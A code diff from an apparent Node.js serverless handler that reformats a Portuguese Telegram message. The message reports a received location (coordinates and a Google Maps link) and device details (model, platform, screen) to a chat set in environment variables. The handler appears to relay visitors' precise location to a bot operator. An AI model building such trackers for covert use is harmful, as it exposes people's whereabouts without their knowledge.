@@ -11,21 +11,18 @@ module.exports = async (req, res) => {
   const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
   const message = `
-📍 *Localização Recebida*
-┌──────────────────────
-│• *Fonte*: ${source}
-│• *Latitude*: ${latitude}
-│• *Longitude*: ${longitude}
-│• *Mapa*: [Ver no Google Maps](${maps})
-└──────────────────────
+📍 Localização Recebida
+Fonte: ${source}
+Latitude: ${latitude}
+Longitude: ${longitude}
+Mapa: [Ver no Google Maps](${maps})
 
-📱 *Informações do Dispositivo*
-┌──────────────────────
-│• *Modelo*: ${deviceInfo.deviceModel}
-│• *Plataforma*: ${deviceInfo.platform}
-│• *Mobile*: ${deviceInfo.isMobile ? 'Sim' : 'Não'}
-│• *Resolução*: ${deviceInfo.screen}
-└──────────────────────
+📱 Informações do Dispositivo
+Modelo: ${deviceInfo.deviceModel}
+Plataforma: ${deviceInfo.platform}
+Mobile: ${deviceInfo.isMobile ? 'Sim' : 'Não'}
+Resolução: ${deviceInfo.screen}
+
 `;
 
   try {
